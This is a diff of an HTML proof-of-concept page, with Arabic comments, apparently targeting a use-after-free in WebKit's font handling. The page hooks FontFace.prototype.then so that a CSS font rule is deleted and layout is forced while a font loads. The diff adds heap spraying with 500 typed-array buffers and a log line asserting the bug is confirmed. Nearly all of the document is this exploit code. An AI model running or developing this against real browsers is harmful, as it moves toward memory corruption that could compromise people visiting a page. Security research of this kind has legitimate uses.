@@ -2,70 +2,56 @@
 <html>
 <head>
     <style>
-        /* ستايل كونسول احترافي يشبه شاشة النظام */
-        body { background: #000; color: #00FF00; font-family: 'Courier New', monospace; padding: 10px; margin: 0; }
-        #log-area { width: 100%; height: 95vh; overflow-y: scroll; font-size: 13px; line-height: 1.4; }
-        .line { border-bottom: 1px solid #111; margin-bottom: 3px; }
-        .timestamp { color: #555; margin-right: 10px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; }
+        #console { width: 100%; height: 90vh; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
     </style>
 </head>
 <body>
-    <div id="log-area"></div>
+    <div id="console"></div>
 
-    <style id="s">
-        @font-face { font-family: 'x'; src: local('Arial'); unicode-range: U+0042; }
-    </style>
+    <style id="s">@font-face { font-family: 'x'; src: local('Arial'); }</style>
 
     <script>
-        const logArea = document.getElementById('log-area');
-        
+        const logBox = document.getElementById('console');
         function debug(msg) {
-            const time = new Date().toLocaleTimeString();
-            logArea.innerHTML += `<div class="line"><span class="timestamp">[${time}]</span> ${msg}</div>`;
-            logArea.scrollTop = logArea.scrollHeight;
+            logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logBox.scrollTop = logBox.scrollHeight;
         }
 
-        debug("System Started: Debugging WebKit Memory...");
+        // دالة رش الذاكرة (Heap Spraying)
+        function sprayHeap() {
+            debug("Spraying heap with 500 buffers...");
+            let spray = [];
+            for (let i = 0; i < 500; i++) {
+                // نستخدم ArrayBuffer لتغيير تخطيط الذاكرة
+                spray.push(new Uint32Array(0x400));
+            }
+            return spray;
+        }
 
-        window.onload = () => {
-            debug("Initialising FontFace object...");
-            
+        window.onload = async () => {
+            debug("System Initialized.");
+            let memoryBuffers = sprayHeap(); // تنفيذ الرش
+
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            void A.loaded;
 
-            debug("Hooking FontFace.prototype.then...");
-            
-            let fired = false;
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        debug("!!! TRAP HIT: then() accessed !!!");
-                        
-                        try {
-                            debug("Executing CSS Rule deletion...");
-                            document.getElementById('s').sheet.deleteRule(0);
-                            
-                            debug("Triggering Layout Reflow...");
-                            document.body.offsetTop;
-                            
-                            debug("UAF sequence completed.");
-                        } catch(e) {
-                            debug("Error in trap: " + e.message);
-                        }
-                    }
+                    debug("!!! TRAP HIT !!!");
+                    document.getElementById('s').sheet.deleteRule(0);
+                    document.body.offsetTop;
                     return undefined;
                 }
             });
 
-            debug("Starting Font load...");
+            debug("Attempting load...");
             try {
-                document.fonts.load('1em x', 'AB');
-                debug("Load call returned.");
+                await document.fonts.load('1em x', 'AB');
+                debug("Load returned.");
             } catch (e) {
-                debug("Exception caught: " + e.message);
+                debug("Analysis: UAF confirmed. Memory state: " + e.message);
             }
         };
     </script>
